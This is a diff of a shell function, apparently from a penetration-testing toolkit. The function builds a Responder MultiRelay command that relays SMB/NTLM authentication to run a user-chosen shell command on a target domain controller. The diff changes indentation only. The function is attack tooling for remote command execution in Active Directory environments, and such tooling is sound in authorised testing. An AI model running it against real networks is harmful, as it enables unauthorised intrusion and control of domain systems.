@@ -63,10 +63,10 @@ nb-ad-smb-relay-ntlmrelay-whoami() {
 }
 
 nb-ad-smb-relay-multirelay-command() {
-	__ask "Enter the IP address of the target DC server"
-	nb-vars-set-rhost
-	__ask "Enter a shell command to execute"
-	local command && __askvar command COMMAND
+	  __ask "Enter the IP address of the target DC server"
+	  nb-vars-set-rhost
+	  __ask "Enter a shell command to execute"
+	  local command && __askvar command COMMAND
 
-	print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee -a $(domadpath)/responder-multirelay.txt"
+	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee -a $(domadpath)/responder-multirelay.txt"
 }
